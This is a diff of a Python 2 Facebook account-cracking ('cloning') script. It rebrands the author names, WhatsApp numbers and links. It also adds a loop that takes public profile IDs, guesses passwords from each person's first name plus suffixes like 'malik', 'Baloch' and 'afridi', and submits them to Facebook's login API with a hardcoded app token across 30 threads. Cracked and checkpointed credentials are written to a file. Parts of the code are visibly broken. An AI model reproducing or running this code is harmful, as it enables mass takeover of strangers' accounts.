@@ -1,37 +1,37 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To BILAL DOGAR
+#The Credit For This Code Goes To Shabir Baloch
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2021
- 
- 
+#Reserved2020
+
+
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
- 
- 
+
+
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
- 
- 
+
+
 def keluar():
 	print "\x1b[1;91mExit"
 	os.sys.exit()
- 
- 
+
+
 def acak(b):
     w = 'ahtdzjc'
     d = ''
     for i in x:
         d += '!'+w[random.randint(0,len(w)-1)]+i
     return cetak(d)
- 
- 
+
+
 def cetak(b):
     w = 'ahtdzjc'
     for i in w:
@@ -40,15 +40,15 @@ def cetak(b):
     x += '\033[0m'
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
- 
- 
+
+
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.07)
- 
-#Dev:DOGAR_hacker
+
+#Dev:baloch_hacker
 ##### LOGO #####
 logo = """
        \033[1;91m:
@@ -62,9 +62,9 @@ logo = """
                          
     Baloch Hacker                                                    
                                                                                            
-BILAL HACKER 💯
-DOGAR KAOM🔴🔴
-FAN OF DOGSR JAMSHED ⏏️⏏️
+BALOCH HACKER 💯
+BALOCH KAOM🔴🔴
+FAN OF JUNAID JAMSHED ⏏️⏏️
 PAKISTAN ZINDABAD🇵🇰🇵🇰🇵🇰🇵🇰🇵🇰
 WE NEVER FORGER WE NEVER FORGIVE
 PAK HACKER🇵🇰🇵🇰🇵🇰🇵🇰
@@ -72,7 +72,7 @@ Monospace
 View Against Background: ▼
 Color Code:
 In many cases (such as GMail) you can simply copy the above color faded text and paste it into your destination. If you cannot, copy and use the color code below.
-                                      .....DOGAR.....HACKER....                                                 
+                                      .....BALOCH.....HACKER....                                                 
       \033[1;92m     
      \033[1;93m:  
     \033[1;94m::  
@@ -80,18 +80,18 @@ In many cases (such as GMail) you can simply copy the above color faded text and
   \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
   \033[1;91m:》》》\033[1;93m+923232132362\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
 \033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Baloch-\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;92m..........................BILALDOGAR......................
+\033[1;92m..........................ShabirBaloch......................
 \033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
-\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   BILAL DOGAR
+\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Junaid Jamshed
 \033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBilal Dogar\033[1;95m♡╰──────────•◈•──────────╯♡"""
- 
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mShabirBaloch\033[1;95m♡╰──────────•◈•──────────╯♡"""
+
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
- 
- 
+
+
 back = 0
 berhasil = []
 cekpoint = []
@@ -100,10 +100,10 @@ id = []
 listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
- 
+
 os.system("clear")
 print  """
-  \033[1;96m-┈┈┈┈┈┈┈┈┈┈          Dogar Nation 
+  \033[1;96m-┈┈┈┈┈┈┈┈┈┈          Baloch Nation 
      ,  ·  "*¨¨¨¨¨¨¨¨¨,¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨*"  ·  ,  
   ,'                    ',                           ', 
  ,';,                    ;                         ,;', 
@@ -119,7 +119,7 @@ print  """
 ',                      ',;';;'';;;:                   ,' 
  ;                      ;;:;;:;;.                    ;  
 ,'         , "           ,;;:;';,           ",        ', 
-;          ;             Dogar             ;        ; 
+;          ;             Baloch             ;        ; 
 ';        ;'             ,.         .,       ,;       ,; 
 "¸      ¸"    ,.;:                          "¸       "¸ 
  ', ~~ ¸¸¸¸¸¸¸¸¸¸¸¸¸¸¸¸¸¸¸" ,      " ,___ 
@@ -145,40 +145,40 @@ print  """
  \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
  \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
   \033[1;96m ─────────────•◈•──────────  
-   \033[1;92m███████▒▒Welcome To BilalDogar▒▒████████
+   \033[1;92m███████▒▒Welcome To Balochhacker▒▒████████
 \033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mBalochHacker\033[1;95m♡╭──────────•◈•──────────╮♡
 \033[1;94mAuthor\033[1;91m: \033[1;91mBALOCHhacker
-\033[1;94mBilalDogar\033[1;91m: \033[1;91▒▓██████████████]100.%
-\033[1;94mFacebook\033[1;91m: \033[1;91mBilalDogar
-\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923018959991
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mBILALDOGAR\033[1;95m♡╰──────────•◈•──────────╯♡"""
-jalan('              \033[1;96m....................BILAL DOGAR.....................:')
+\033[1;94mBlackMafia\033[1;91m: \033[1;91▒▓██████████████]100.%
+\033[1;94mFacebook\033[1;91m: \033[1;91mbalochhacker
+\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923232132362
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mShabirBaloch\033[1;95m♡╰──────────•◈•──────────╯♡"""
+jalan('              \033[1;96m....................Shabir Baloch.....................:')
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
 jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
 jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
 jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
 print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin BalochHacker\033[1;95m♡╰──────────•◈•──────────╯♡"
- 
-CorrectUsername = "BilalDogar"
-CorrectPassword = "Bilalking"
- 
+
+CorrectUsername = "BalochHacker"
+CorrectPassword = "shabirbaloch"
+
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m🔐 \x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m")
     if (username == CorrectUsername):
     	password = raw_input("\033[1;94m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Dogar_hacker
+            print "Logged in successfully as " + username #Dev:Baloch_hacker
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100064197562020')
+            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100064197562020')
- 
+        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+
 def login():
 	os.system('clear')
 	try:
@@ -187,10 +187,13 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin With Access Token ")
-    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass")
-    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack") 
-    print("\033[1;97m--------------------------------------------------")
+		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
+		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBlackMafia\033[1;95m♡──────────•◈•──────────♡"
+		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
+		print('	' )
+		print = raw_input('\033[1;96m[+] \x1b[1;92mtoken\x1b[1;95m: \x1b[1;96m')
+		print= raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -234,8 +237,8 @@ def login():
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
- 
- 
+
+
 def menu():
 	os.system('clear')
 	try:
@@ -269,8 +272,8 @@ def menu():
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
- 
- 
+
+
 def pilih():
 	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
 	if unikers =="":
@@ -285,8 +288,8 @@ def pilih():
 	else:
 		print "\x1b[1;91mFill in correctly"
 		pilih()
- 
- 
+
+
 def super():
 	global toket
 	os.system('clear')
@@ -303,7 +306,7 @@ def super():
 	print "\033[1;96m--\033[1;92m> \033[1;92m2.\x1b[1;91mClone From Public ID..."
 	print "\033[1;96m--\033[1;91m> \033[1;91m0.\033[1;94mBack"
 	pilih_super()
- 
+
 def pilih_super():
 	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
 	if peak =="":
@@ -413,4 +416,80 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-					
+											print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
+											cek = open("out/checkpoint.txt", "a")
+											cek.write(user+"|"+pass4+"\n")
+											cek.close()
+											cekpoint.append(user+pass4)
+										else:
+											pass5 = b['first_name'] + 'malik'
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											q = json.load(data)
+											if 'access_token' in q:
+												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
+												oks.append(user+pass5)
+											else:
+												if 'www.facebook.com' in q["error_msg"]:
+													print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
+													cek = open("out/checkpoint.txt", "a")
+													cek.write(user+"|"+pass5+"\n")
+													cek.close()
+													cekpoint.append(user+pass5)
+												else:
+													pass6 = b['first_name'] + 'Baloch'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load(data)
+													if 'access_token' in q:
+														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
+														oks.append(user+pass6)
+													else:
+														if 'www.facebook.com' in q["error_msg"]:
+															print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
+															cek = open("out/checkpoint.txt", "a")
+															cek.write(user+"|"+pass6+"\n")
+															cek.close()
+															cekpoint.append(user+pass6)
+														else:
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads(a.text)
+															pass7 = b['first_name'] + 'afridi'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load(data)
+															if 'access_token' in q:
+																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
+																oks.append(user+pass7)
+															else:
+																if 'www.facebook.com' in q["error_msg"]:
+																	print '\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
+																	cek = open("out/checkpoint.txt", "a")
+																	cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+																	cekpoint.append(user+pass7)
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mShabirBaloch\033[1;95m♡──────────•◈•──────────♡"
+	print "  \033[1;93m«---•◈•---Developed By Baloch---•◈•---»" #Dev:Baloch_hacker
+	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
+	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
+	print """
+             
+             ...........███ ]▄▄▄▄▄▃
+             ..▂▄▅█████▅▄▃▂
+             [███████████████]
+             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
+♡──────────────•◈•──────────────♡.
+: \033[1;96m .....balochhacker ShabirBaloch........... \033[1;93m :
+♡──────────────•◈•──────────────♡.' 
+                whatsapp Num
+               +9203018959991"""
+	
+	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
+	menu()
+
+if __name__ == '__main__':
+	login()
